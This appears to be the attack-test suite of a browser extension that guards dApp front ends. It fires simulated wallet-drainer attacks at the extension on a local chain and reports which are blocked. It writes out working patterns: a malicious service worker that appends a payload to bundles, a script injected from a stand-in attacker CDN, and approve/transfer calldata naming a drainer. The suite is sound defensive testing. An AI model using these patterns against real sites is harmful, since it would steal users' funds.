// The attack suite: every threat in THREAT_MODEL.md that can be run, against Guard (enforce mode) on the staging
// chain, with the demo dApp sealed through the real CLI. Prints one line and writes docs/attack-report.md.
//
//   pnpm attacks        (needs pnpm staging:up; takes a few minutes)
//
// An attack counts as BLOCKED only if the attacker's signature request never reached the wallet. A clean session
// counts as a FALSE BLOCK if Guard refused any of the user's own actions, sent the tab to the warning page, or
// showed a red badge.
import http from 'node:http';
import { cpSync, existsSync, mkdtempSync, readFileSync, readdirSync, writeFileSync, appendFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, extname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium, type Page } from 'playwright';
import { createWalletClient, encodeFunctionData, http as viemHttp, parseAbi, type Address } from 'viem';
import {
  anvil, net, pub, signet, sealDemoDapp, rpcProxy, buildExtension, startGateway, openBrowser, installMockWallet, until, synced, tabIdOf, badge, events, signed,
  USER, TOKEN, ROUTER, DRAINER, TAMPER, type Project, type Session, type WalletCall,
} from '@signet/extension/test/staging/harness.ts';
import { encodeLabel } from '@signet/extension/src/lib/label.ts';
import { POISON } from '@signet/cli/test/fixtures.ts';
import { tick } from '@signet/watchtower/src/watchtower.ts';
import { netFromEnv } from '@signet/watchtower/src/cli.ts';
import { consoleAlerter } from '@signet/watchtower/src/alerts.ts';

const ROOT = fileURLToPath(new URL('../../..', import.meta.url));
const OLD_ROUTER = '0x01D0aBCD000000000000000000000000000D0A1d'; // a spender release 1 sealed and release 2 dropped
const lc = (a: string) => a.toLowerCase().slice(2);
const gateAbi = parseAbi(['function enforce()', 'function revoke(uint64)']);
const log = (s: string) => process.stdout.write(`${s}\n`);
// ATTACKS_ONLY=revoked,poisoned-npm runs only those (and no clean sessions): for debugging, not for the report
const ONLY = process.env.ATTACKS_ONLY?.split(',');
const want = (id: string) => !ONLY || ONLY.includes(id);

// ---------------------------------------------------------------- the web server: one host per project, plus the attacker's CDN

type Patch = (path: string, body: Buffer | null, hits: number) => Buffer | string | null | undefined;
interface Host { dist: string; patch?: Patch; extra?: Record<string, string> }
const hosts = new Map<string, Host>();
const hits = new Map<string, number>();
const TYPES: Record<string, string> = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml' };
const server = http.createServer((req, res) => {
  const host = (req.headers.host ?? '').split(':')[0]!;
  const path = req.url!.split('?')[0]!;
  const rel = path === '/' ? 'index.html' : path.slice(1);
  if (host === 'cdn.evil.example.test') {
    res.setHeader('content-type', 'text/javascript');
    return void res.end(TAMPER);
  }
  const h = hosts.get(host);
  if (!h) return void ((res.statusCode = 404), res.end());
  const key = `${host}/${rel}`;
  const n = (hits.get(key) ?? 0) + 1;
  hits.set(key, n);
  const file = join(h.dist, rel);
  const orig = !rel.includes('..') && existsSync(file) ? readFileSync(file) : null;
  const patched = h.patch?.(rel, orig, n);
  const body = patched === undefined ? orig : patched;
  if (body === null) return void ((res.statusCode = 404), res.end());
  res.setHeader('content-type', TYPES[extname(rel)] ?? 'application/octet-stream');
  res.setHeader('cache-control', rel.endsWith('.html') ? 'no-cache' : 'public, max-age=3600');
  res.end(body);
});
let port = 0;
/// What a fresh download of a path gets now (the made-up staging hosts don't resolve outside the browser).
const download = (host: string, path: string) =>
  new Promise<string>((res, rej) => http.get({ host: '127.0.0.1', port, path, headers: { host: `${host}:${port}` } }, (r) => {
    let b = '';
    r.on('data', (d) => (b += d));
    r.on('end', () => res(b));
  }).on('error', rej));
const urlOf = (p: Project, q = '') => `http://${p.domain}:${port}/${q}`;
const mainOf = (dist: string) => `assets/${readdirSync(join(dist, 'assets')).find((f) => /^index-.*\.js$/.test(f))}`;
const lazyOf = (dist: string) => `assets/${readdirSync(join(dist, 'assets')).find((f) => /^lazy-.*\.js$/.test(f))}`;

// ---------------------------------------------------------------- results

interface Attack { id: string; threat: string; vector: string; blocked: boolean; how: string; note?: string }
interface Clean { name: string; falseBlock: boolean; why: string }
const attacks: Attack[] = [];
const cleans: Clean[] = [];

let ext = '';
let origins = '';
const projects: Project[] = [];

async function guardBrowser(late = false): Promise<Session> {
  const s = await openBrowser(ext, { origin: origins, late });
  for (const p of projects) await synced(s, p.domain);
  return s;
}
const harmful = (w: WalletCall[], ...needles: string[]) => w.filter((c) => /sendTransaction|sign/i.test(c.method) && needles.some((n) => c.params.toLowerCase().includes(n)));
async function lastRefusal(s: Session): Promise<string> {
  const e = (await events(s)).find((x) => x.refused);
  return e ? `${e.title} (${e.details.at(-1)})` : 'no refusal recorded';
}
async function onWarningPage(page: Page): Promise<boolean> {
  return until('the warning page', () => page.url().startsWith('chrome-extension:') && page.url().includes('blocked.html'), 15000).then(() => true, () => false);
}
async function settle(ms = 2500): Promise<void> {
  await new Promise((r) => setTimeout(r, ms));
}
/// Clicks a demo-dApp button and returns its status line.
async function click(page: Page, id: string): Promise<string> {
  await page.evaluate(() => document.getElementById('signet-guard-notice')?.remove());
  await page.click(`#${id}`);
  await page.waitForFunction(() => document.getElementById('status')!.dataset.state !== 'idle', null, { timeout: 15000 });
  const t = (await page.locator('#status').textContent())!;
  await page.evaluate(() => (document.getElementById('status')!.dataset.state = 'idle'));
  return t;
}

async function record(a: Omit<Attack, 'blocked' | 'how'>, s: Session | null, w: WalletCall[], needles: string[], how: () => Promise<string>, note?: string): Promise<void> {
  const leaked = harmful(w, ...needles);
  const r: Attack = { ...a, blocked: leaked.length === 0, how: leaked.length ? `reached the wallet: ${leaked[0]!.method}` : await how(), note };
  attacks.push(r);
  log(`  ${r.blocked ? 'BLOCKED' : 'NOT BLOCKED'}  ${r.id}: ${r.how}`);
  void s;
}

// ---------------------------------------------------------------- setup

async function setup(): Promise<{ p1: Project; p2: Project; p3: Project; gateway: Awaited<ReturnType<typeof startGateway>> }> {
  await anvil('anvil_nodeInfo').catch(() => {
    throw new Error(`the staging chain is not running at ${net.rpcUrl}: pnpm staging:up`);
  });
  const t = Date.now().toString(36);
  log('setting up 3 sealed projects with the real CLI (demo dApp, first release, full copy on-chain)...');
  const p1 = await sealDemoDapp(`atk-${t}.signet.test`);
  const p2 = await sealDemoDapp(`atk2-${t}.signet.test`, { spenders: [OLD_ROUTER] });
  const p3 = await sealDemoDapp(`atk3-${t}.signet.test`);
  projects.push(p1, p2, p3);
  for (const p of projects) hosts.set(p.domain, { dist: p.dist });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  port = (server.address() as { port: number }).port;
  origins = projects.map((p) => `http://${p.domain}:${port}`).join(',');
  const [a, b] = [await rpcProxy(), await rpcProxy()];
  const gateway = await startGateway(a.url, b.url);
  ext = buildExtension(a.url, b.url, gateway);
  // enforce mode on all three (allowed 7 days after each gate was created)
  await anvil('evm_increaseTime', [`0x${(7 * 86400 + 60).toString(16)}`]);
  await anvil('anvil_mine', ['0x1']);
  const wallet = createWalletClient({ transport: viemHttp(net.rpcUrl) });
  for (const p of projects) {
    const hash = await wallet.sendTransaction({ account: net.accounts!.approvers[0] as Address, to: p.gate, chain: null, data: encodeFunctionData({ abi: gateAbi, functionName: 'enforce' }) });
    await until('enforce', () => pub.getTransactionReceipt({ hash }), 30000);
  }
  return { p1, p2, p3, gateway };
}

/// Release 2 of a project: tier 10 (2 approvals + 24 h). Returns the Diff Guard flags and the tier.
async function release2(p: Project, dist: string, cfgEdit?: (c: Record<string, unknown>) => void): Promise<{ flags: string[]; tier: number; id: string }> {
  const cfgFile = join(p.dir, 'signet.config.json');
  if (cfgEdit) {
    const c = JSON.parse(readFileSync(cfgFile, 'utf8'));
    cfgEdit(c);
    writeFileSync(cfgFile, JSON.stringify(c, null, 2));
  }
  signet(p.dir, ['seal', dist]);
  const id = signet(p.dir, ['propose', dist]).match(/Proposed release #(\d+)/)![1]!;
  const diff = JSON.parse(signet(p.dir, ['diff', id, dist, '--json'])) as { flags: string[]; onchain: { tier: number } };
  signet(p.dir, ['approve', id], 'approver1');
  signet(p.dir, ['approve', id], 'approver2');
  return { flags: diff.flags, tier: diff.onchain.tier, id };
}

// ---------------------------------------------------------------- clean sessions (false blocks)

async function cleanSession(name: string, p: Project, o: { late?: boolean; reload?: boolean; url?: string } = {}): Promise<void> {
  const s = await guardBrowser(o.late);
  let why = '';
  try {
    const page = s.ctx.pages()[0]!;
    await page.goto(o.url ?? urlOf(p), { waitUntil: 'load' });
    if (o.reload) await page.reload({ waitUntil: 'load' }); // files now come from the browser cache
    await page.waitForSelector('#app[data-lazy="loaded"]', { timeout: 30000 });
    for (const b of ['approve', 'swap', 'permit', 'stake']) {
      const t = await click(page, b);
      if (!/done/.test(t)) why ||= `${b}: ${t}`;
    }
    if (page.url().includes('blocked.html')) why ||= 'sent to the warning page';
    const tab = await tabIdOf(s, page);
    const light = await until('a badge', async () => (await badge(s, tab)) || null, 15000).catch(() => '');
    if (light === '!') why ||= 'red badge';
    const refused = (await events(s)).filter((e) => e.refused);
    if (refused.length) why ||= `refused: ${refused[0]!.title}`;
  } catch (e) {
    why = `error: ${(e as Error).message.split('\n')[0]}`;
  } finally {
    await s.close();
  }
  cleans.push({ name, falseBlock: !!why, why: why || 'approve, swap, Permit2 and stake all went through; badge OK' });
  log(`  ${why ? 'FALSE BLOCK' : 'clean ok'}  ${name}${why ? `: ${why}` : ''}`);
}

// ---------------------------------------------------------------- the attacks

export async function run(): Promise<{ blocked: number; total: number; falseBlocks: number; clean: number }> {
  const { p1, p2, p3, gateway } = await setup();
  const main1 = mainOf(p1.dist);
  const h1 = hosts.get(p1.domain)!;
  const fresh = () => {
    hits.clear();
    h1.patch = undefined;
  };

  log('\nclean sessions (before the attacks)');
  if (!ONLY) {
  for (let i = 0; i < 5; i++) await cleanSession(`normal use #${i + 1}, wallet installed first`, p1);
  for (let i = 0; i < 5; i++) await cleanSession(`normal use #${i + 1}, wallet installed late`, p1, { late: true });
  for (let i = 0; i < 3; i++) await cleanSession(`reload, files from the browser cache #${i + 1}`, p1, { reload: true });
  for (let i = 0; i < 2; i++) await cleanSession(`verified copy on the gateway #${i + 1}`, p1, { url: `http://${encodeLabel(p1.domain)}.localhost:${gateway.port}/` });
  }

  log('\nattacks');
  // 1. DNS / registrar hijack: the whole site is replaced by a look-alike that drains on load
  if (want('dns-hijack')) {
    fresh();
    h1.patch = (rel) => (rel === 'index.html' ? '<!doctype html><title>Demo Swap</title><h1>Demo Swap</h1><p id="status">Ready.</p><script src="/assets/app.js"></script>' : rel === 'assets/app.js' ? TAMPER : undefined);
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1)).catch(() => {});
    const red = await onWarningPage(page);
    await settle();
    await record({ id: 'dns-hijack', threat: '1', vector: 'DNS / registrar hijack: whole site replaced, drainer on load' }, s, s.wallet, [lc(DRAINER)], async () => (red ? 'page blocked (warning page), signature refused' : await lastRefusal(s)));
    await s.close();
  }
  // 2. one JS chunk swapped on the CDN (the lazily loaded one)
  if (want('swapped-chunk')) {
    fresh();
    const lazy = lazyOf(p1.dist);
    h1.patch = (rel, body) => (rel === lazy ? Buffer.concat([body!, Buffer.from(TAMPER)]) : undefined);
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1)).catch(() => {});
    const red = await onWarningPage(page);
    await settle();
    await record({ id: 'swapped-chunk', threat: '2', vector: 'one lazy-loaded JS chunk swapped on the CDN/S3' }, s, s.wallet, [lc(DRAINER)], async () => (red ? 'chunk hash mismatch: page blocked, signature refused' : await lastRefusal(s)));
    await s.close();
  }
  // 3. Bybit pattern: the main bundle is tampered for the first request only, then served clean
  if (want('swap-back')) {
    fresh();
    h1.patch = (rel, body, n) => (rel === main1 && n === 1 ? Buffer.concat([body!, Buffer.from(TAMPER)]) : undefined);
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1)).catch(() => {});
    const red = await onWarningPage(page);
    await settle();
    const reDownloadClean = !(await download(p1.domain, `/${main1}`)).includes('DRAINER');
    await record({ id: 'swap-back', threat: '4', vector: 'bundle tampered for one request, then swapped back (Bybit)' }, s, s.wallet, [lc(DRAINER)], async () => (red ? `cache read caught the bytes that ran (a re-download now gets ${reDownloadClean ? 'clean' : 'tampered'} bytes): page blocked` : await lastRefusal(s)));
    await s.close();
  }
  // 4. a script injected into the HTML, from the attacker's CDN
  if (want('injected-script')) {
    fresh();
    h1.patch = (rel, body) => (rel === 'index.html' ? body!.toString().replace('</body>', `<script src="http://cdn.evil.example.test:${port}/x.js"></script></body>`) : undefined);
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1)).catch(() => {});
    const red = await onWarningPage(page);
    await settle();
    await record({ id: 'injected-script', threat: '3', vector: '<script> from an unsealed origin injected into the HTML' }, s, s.wallet, [lc(DRAINER)], async () => (red ? 'HTML hash mismatch + unsealed origin: page blocked' : await lastRefusal(s)));
    await s.close();
  }
  // 5. code that is not in any file: eval / new Function from hostile data (XSS, a compromised config API)
  if (want('eval-code')) {
    fresh();
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1), { waitUntil: 'load' });
    await page.waitForSelector('#app[data-lazy="loaded"]');
    const word = (a: string) => lc(a).padStart(64, '0');
    const out = await page.evaluate(async ({ approve, transfer }) => {
      const r: string[] = [];
      const eth = (window as unknown as { ethereum: { request(a: unknown): Promise<unknown> } }).ethereum;
      (window as unknown as { __eth: unknown }).__eth = eth;
      // eslint-disable-next-line no-new-func
      r.push(await new Function(`return __eth.request({method:"eth_sendTransaction",params:[{from:"${'0x1111111111111111111111111111111111111111'}",to:"0x1E4a5963aBFD975d8c9021ce480b42188849D41d",data:"${approve}"}]})`)().then(() => 'sent', (e: Error) => e.message));
      // eslint-disable-next-line no-eval
      r.push(await (0, eval)(`__eth.request({method:"eth_sendTransaction",params:[{from:"0x1111111111111111111111111111111111111111",to:"0x1E4a5963aBFD975d8c9021ce480b42188849D41d",data:"${transfer}"}]})`).then(() => 'sent', (e: Error) => e.message));
      return r;
    }, { approve: `0x095ea7b3${word(DRAINER)}${'f'.repeat(64)}`, transfer: `0xa9059cbb${word(DRAINER)}${(5n).toString(16).padStart(64, '0')}` });
    const tab = await tabIdOf(s, page);
    await record({ id: 'eval-code', threat: '3', vector: 'code from data via new Function / eval (no file changed): approve and transfer to the attacker' }, s, s.wallet, [lc(DRAINER)],
      async () => `page check stays green (${await badge(s, tab)}): no file changed. The signing check refused both: ${out.map((m) => m.replace(/^Signet Guard refused this signature: /, '').split('.')[0]).join('; ')}`,
      'Page integrity can\'t see code that arrives as data; only the signing-time allowlist stops it.');
    await s.close();
  }
  // 6. a malicious service worker left on the domain: installed during a hijack, it keeps serving tampered code after DNS is fixed
  if (want('service-worker')) {
    fresh();
    const SW = `self.addEventListener('install',()=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('fetch',e=>{const u=new URL(e.request.url);if(/\\/assets\\/index-.*\\.js$/.test(u.pathname))e.respondWith(fetch(e.request).then(r=>r.text()).then(t=>new Response(t+${JSON.stringify(TAMPER)},{headers:{'content-type':'text/javascript'}})))});`;
    h1.patch = (rel, body) => (rel === 'index.html' ? body!.toString().replace('<head>', '<head><script>navigator.serviceWorker.register("/sw-update.js")</script>') : rel === 'sw-update.js' ? SW : undefined);
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1)).catch(() => {});
    await settle(1500);
    h1.patch = (rel) => (rel === 'sw-update.js' ? SW : undefined); // the hijack is over: the server is clean again
    const p2page = await s.ctx.newPage();
    await p2page.goto(urlOf(p1)).catch(() => {});
    const installed = await p2page.evaluate(async () => (await navigator.serviceWorker.getRegistrations()).length).catch(() => -1);
    const red = await onWarningPage(p2page);
    await settle();
    await record({ id: 'service-worker', threat: '14', vector: 'malicious service worker that outlives the hijack', }, s, s.wallet, [lc(DRAINER)],
      async () => (red ? `unsealed service worker script detected on the next visit (registrations: ${installed}): page blocked` : await lastRefusal(s)));
    await s.close();
  }
  // 7. allowlisted router, attacker as recipient (hostile quote API; the page code is genuine)
  if (want('router-recipient')) {
    fresh();
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1, `?recipient=${DRAINER}`), { waitUntil: 'load' });
    await page.waitForSelector('#app[data-lazy="loaded"]');
    const t = await click(page, 'swap');
    await record({ id: 'router-recipient', threat: '6', vector: 'swap on the sealed router with the attacker as recipient' }, s, s.wallet, [lc(DRAINER)], async () => t.replace(/^Swap: refused \[4001\]: Signet Guard refused this signature: /, 'refused: ').split('.')[0]!);
    await s.close();
  }
  // 8. permit phishing: a Permit2 signature and an EIP-2612 permit naming the attacker as spender
  if (want('permit-phishing')) {
    fresh();
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1, `?spender=${DRAINER}`), { waitUntil: 'load' });
    await page.waitForSelector('#app[data-lazy="loaded"]');
    const t1 = await click(page, 'permit');
    const t2 = await page.evaluate(async (d) => {
      const eth = (window as unknown as { ethereum: { request(a: unknown): Promise<unknown> } }).ethereum;
      const typed = { primaryType: 'Permit', domain: { name: 'USDT', chainId: 196, verifyingContract: '0x1E4a5963aBFD975d8c9021ce480b42188849D41d' }, message: { owner: '0x1111111111111111111111111111111111111111', spender: d, value: '1000000000', nonce: 0, deadline: 1893456000 }, types: {} };
      return eth.request({ method: 'eth_signTypedData_v4', params: ['0x1111111111111111111111111111111111111111', JSON.stringify(typed)] }).then(() => 'sent', (e: Error) => e.message);
    }, DRAINER);
    await record({ id: 'permit-phishing', threat: '6', vector: 'Permit2 and EIP-2612 permit signatures naming the attacker as spender' }, s, s.wallet, [lc(DRAINER)], async () => `both refused: ${/Spender not in the sealed allowlist/.test(t1) && /Spender not in the sealed allowlist/.test(t2) ? 'spender not sealed (Permit2, EIP-2612)' : `${t1} / ${t2}`}`);
    await s.close();
  }
  // 9. poisoned npm package: the drainer is IN the build, so it is sealed. Approvers wave it through.
  if (want('poisoned-npm')) {
    const dist = join(p3.dir, 'poisoned');
    cpSync(p3.dist, dist, { recursive: true });
    const m = mainOf(dist);
    appendFileSync(join(dist, m), POISON);
    const r = await release2(p3, dist);
    await anvil('evm_increaseTime', [`0x${(86400 + 60).toString(16)}`]);
    await anvil('anvil_mine', ['0x1']);
    signet(p3.dir, ['publish', r.id, dist], 'user2');
    hosts.set(p3.domain, { dist });
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p3), { waitUntil: 'load' });
    await page.waitForSelector('#app[data-lazy="loaded"]');
    const tab = await tabIdOf(s, page);
    const light = await until('badge OK', async () => ((await badge(s, tab)) === 'OK' ? 'OK' : null)).catch(async () => (await badge(s, tab)) || 'none');
    const out = await page.evaluate(async ({ token, user }) => {
      // the drainer first fetches its config from the attacker's origin; that host doesn't exist here, so it is answered in the page
      const real = window.fetch;
      window.fetch = (u: RequestInfo | URL, i?: RequestInit) => (String(u).includes('connect-kit-assets') ? Promise.resolve(new Response('{"pull":true}')) : real(u, i));
      const g = globalThis as unknown as { __ck(w: unknown, t: string, a: string): Promise<unknown>; ethereum: unknown };
      return g.__ck(g.ethereum, token, user).then(() => 'sent', (e: Error) => e.message);
    }, { token: TOKEN, user: USER });
    if (process.env.ATTACKS_DEBUG) log(JSON.stringify({ light, out, wallet: s.wallet, events: await events(s), report: await s.sw.evaluate(async (t) => (await chrome.storage.session.get(`tab:${t}`))[`tab:${t}`], tab) }, null, 1));
    await record({ id: 'poisoned-npm', threat: '5', vector: 'poisoned dependency adds a drainer address, origin and approve/transferFrom calls; approvers publish it anyway' }, s, s.wallet, [lc(DRAINER)],
      async () => `Diff Guard flagged it (${r.flags.length} flags) and the chain made it tier ${['00', '01', '10', '11'][r.tier]} (2 approvals + 24 h); once published the page check is green (${light}) because the drainer is sealed, but the signing check refused: ${out.replace(/^Signet Guard refused this signature: /, '').split('.')[0]}`,
      'Stopped because the drainer was not a sealed SPENDER and transfers go only to the user by default. A poisoned package that only calls sealed contracts with a recipient it may use is not stopped (THREAT_MODEL.md).');
    await s.close();
  }
  // 10. rollback: the attacker serves an older genuine release whose allowlist had a spender later dropped
  if (want('rollback')) {
    const v2 = join(p2.dir, 'v2');
    cpSync(p2.dist, v2, { recursive: true });
    appendFileSync(join(v2, mainOf(v2)), '\n;/* release 2: OLD_ROUTER retired */\n');
    // a user visits while release 1 is current: their Guard verifies release 1's manifest and keeps it
    const s0 = await guardBrowser();
    const p0 = s0.ctx.pages()[0]!;
    await p0.goto(urlOf(p2), { waitUntil: 'load' });
    await p0.waitForSelector('#app[data-lazy="loaded"]');
    await until('release 1 verified', async () => (await badge(s0, await tabIdOf(s0, p0))) === 'OK');
    const r = await release2(p2, v2, (c) => ((c.allowlist as Record<string, { spenders: string[] }>)['196']!.spenders = [ROUTER]));
    await anvil('evm_increaseTime', [`0x${(86400 + 60).toString(16)}`]);
    await anvil('anvil_mine', ['0x1']);
    signet(p2.dir, ['publish', r.id, v2], 'user2');
    // Guard re-reads a sealed domain from the chain at most once a minute: wait that out (a known lag, THREAT_MODEL.md)
    await settle(61_000);
    // the attacker keeps serving release 1 (genuine files: they were sealed once) and asks for the retired spender
    const p0b = await s0.ctx.newPage();
    await p0b.goto(urlOf(p2, `?spender=${OLD_ROUTER}`), { waitUntil: 'load' }).catch(() => {});
    const redIn = await onWarningPage(p0b);
    let refusedIn = '';
    if (!redIn) {
      await p0b.waitForSelector('#app[data-lazy="loaded"]');
      refusedIn = await click(p0b, 'approve');
    }
    await record({ id: 'rollback-in-grace', threat: 'R', vector: 'rollback to release 1 inside the 6 h grace window, for a user whose Guard saw release 1, approving a spender release 2 retired' }, s0, s0.wallet, [lc(OLD_ROUTER)],
      async () => (redIn ? 'page blocked' : `the old files are accepted (grace window), but the CURRENT allowlist refused the retired spender: ${refusedIn.includes('Spender not in the sealed allowlist') ? 'spender not sealed' : refusedIn}`));
    await s0.close();
    await anvil('evm_increaseTime', [`0x${(6 * 3600 + 60).toString(16)}`]);
    await anvil('anvil_mine', ['0x1']);
    const s1 = await guardBrowser();
    const p1b = s1.ctx.pages()[0]!;
    await p1b.goto(urlOf(p2, `?spender=${OLD_ROUTER}`)).catch(() => {});
    const red = await onWarningPage(p1b);
    await settle();
    await record({ id: 'rollback', threat: 'R', vector: 'rollback to release 1 after the grace window' }, s1, s1.wallet, [lc(OLD_ROUTER)], async () => (red ? 'release 1 is no longer valid on-chain: page blocked' : await lastRefusal(s1)));
    await s1.close();
    hosts.set(p2.domain, { dist: v2 });
  }
  // 11. users without Guard (honest limit): the same DNS hijack, in a browser without the extension
  if (want('no-extension')) {
    fresh();
    h1.patch = (rel) => (rel === 'index.html' ? '<!doctype html><title>Demo Swap</title><h1>Demo Swap</h1><script src="/assets/app.js"></script>' : rel === 'assets/app.js' ? TAMPER : undefined);
    const b = await chromium.launch({ headless: true, args: ['--host-resolver-rules=MAP *.signet.test 127.0.0.1'] });
    const ctx = await b.newContext();
    const w = await installMockWallet(ctx);
    await (await ctx.newPage()).goto(urlOf(p1)).catch(() => {});
    await settle();
    await b.close();
    // what protects them instead: the watchtower's alert to the team
    const lines: string[] = [];
    const started = Date.now();
    const towerBrowser = await chromium.launch({ headless: true, args: ['--host-resolver-rules=MAP *.signet.test 127.0.0.1'] });
    const r = await tick({ net: netFromEnv({ SIGNET_NETWORK: 'local' }), alert: consoleAlerter((l) => void lines.push(l)), statePath: join(mkdtempSync(join(tmpdir(), 'atk-tower-')), 's.json'), urlFor: () => urlOf(p1), only: [p1.domain], confirmDelayMs: 500 }, towerBrowser);
    await towerBrowser.close();
    const alerted = r.alerts > 0 && lines.some((l) => /does not match its sealed release/.test(l));
    await record({ id: 'no-extension', threat: '1', vector: 'the DNS hijack against a user WITHOUT Guard' }, null, w, [lc(DRAINER)], async () => '', `Not blockable without Guard or a wallet that does the same check. The watchtower ${alerted ? `confirmed the mismatch on two loads and alerted the team ${((Date.now() - started) / 1000).toFixed(1)} s into its round (it runs once a minute, so within about a minute of the hijack)` : 'did NOT alert'}; the team can then freeze and warn users.`);
    h1.patch = undefined;
  }
  // 12. revoked release: the approvers withdraw release 1 (say it turned out to be malicious); users must not sign on it
  if (want('revoked')) {
    fresh();
    const wallet = createWalletClient({ transport: viemHttp(net.rpcUrl) });
    const hash = await wallet.sendTransaction({ account: net.accounts!.approvers[1] as Address, to: p1.gate, chain: null, data: encodeFunctionData({ abi: gateAbi, functionName: 'revoke', args: [1n] }) });
    await until('revoke', () => pub.getTransactionReceipt({ hash }), 30000);
    const s = await guardBrowser();
    const page = s.ctx.pages()[0]!;
    await page.goto(urlOf(p1)).catch(() => {});
    const red = await onWarningPage(page);
    await settle();
    // the user insists ("Go back to the site"): the page loads, and even a signature the revoked release allowed
    // (approve the sealed router) is refused
    let t = 'no warning page';
    if (red) {
      await page.waitForSelector('#back');
      await page.click('#back');
      await page.waitForURL(urlOf(p1));
      await page.waitForLoadState('load');
      await settle(1500);
      t = await page.evaluate(async (router) => {
        const eth = (window as unknown as { ethereum: { request(a: unknown): Promise<unknown> } }).ethereum;
        return eth.request({ method: 'eth_sendTransaction', params: [{ from: '0x1111111111111111111111111111111111111111', to: '0x1E4a5963aBFD975d8c9021ce480b42188849D41d', data: `0x095ea7b3${router.toLowerCase().slice(2).padStart(64, '0')}${'1'.padStart(64, '0')}` }] }).then(() => 'sent', (e: Error) => e.message);
      }, ROUTER);
    }
    if (process.env.ATTACKS_DEBUG) log(JSON.stringify({ wallet: s.wallet, events: await events(s), pages: s.ctx.pages().map((x) => x.url()) }, null, 1));
    await record({ id: 'revoked', threat: 'V', vector: 'signing on a release the approvers revoked' }, s, s.wallet, ['095ea7b3'], async () => `${red ? 'page blocked; ' : ''}signature refused: ${t.replace(/^Signet Guard refused this signature: /, '').split('.')[0]}`);
    await s.close();
  }

  // the one clean session that only makes sense after a release: a user with the previous version in the cache
  log('\nclean session across a release');
  {
    // p2 published release 2 above, and its grace window is over; check a user who loads release 2 normally
    await cleanSession('normal use right after a new release (tier 10, release 2)', p2);
  }

  const total = attacks.length;
  const blocked = attacks.filter((a) => a.blocked).length;
  const falseBlocks = cleans.filter((c) => c.falseBlock).length;
  const line = `Blocked ${blocked}/${total} attacks; false blocks: ${falseBlocks} on ${cleans.length} clean sessions.`;
  log(`\n${line}`);
  if (!ONLY) report(line);
  server.close();
  return { blocked, total, falseBlocks, clean: cleans.length };
}

function report(line: string): void {
  const md = `# Attack report

Generated by \`pnpm attacks\` (\`packages/attacks/src/suite.ts\`) on ${new Date().toISOString().slice(0, 10)}, on the local staging chain
(an anvil fork of X Layer mainnet) with the demo dApp sealed through the real CLI, Guard built from this repo
(enforce mode), and the Guard decision circuit taped out on the fork. Threats refer to \`THREAT_MODEL.md\`.

**${line}**

An attack is **blocked** only if the attacker's signature request never reached the wallet. A clean session is a
**false block** if Guard refused any of the user's own actions, showed the warning page or turned the badge red.

## Attacks

| # | Attack | Threat | Result | How |
|---|---|---|---|---|
${attacks.map((a, i) => `| ${i + 1} | ${a.vector} | ${a.threat} | ${a.blocked ? '**blocked**' : '**not blocked**'} | ${a.how.replace(/\|/g, '/')}${a.note ? ` *${a.note}*` : ''} |`).join('\n')}

Not run (documented only): **a compromised Guard extension or Chrome Web Store account** (threat 17). See \`THREAT_MODEL.md\`.

## Clean sessions

| # | Session | Result |
|---|---|---|
${cleans.map((c, i) => `| ${i + 1} | ${c.name} | ${c.falseBlock ? `**false block**: ${c.why}` : c.why} |`).join('\n')}
`;
  writeFileSync(join(ROOT, 'docs/attack-report.md'), md);
  mkdirSync(join(ROOT, 'docs/demo'), { recursive: true });
  writeFileSync(join(ROOT, 'docs/demo/attack-report.json'), JSON.stringify({ line, attacks, cleans }, null, 2) + '\n');
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  run().then(() => process.exit(0), (e) => {
    console.error(e);
    process.exit(1);
  });
}
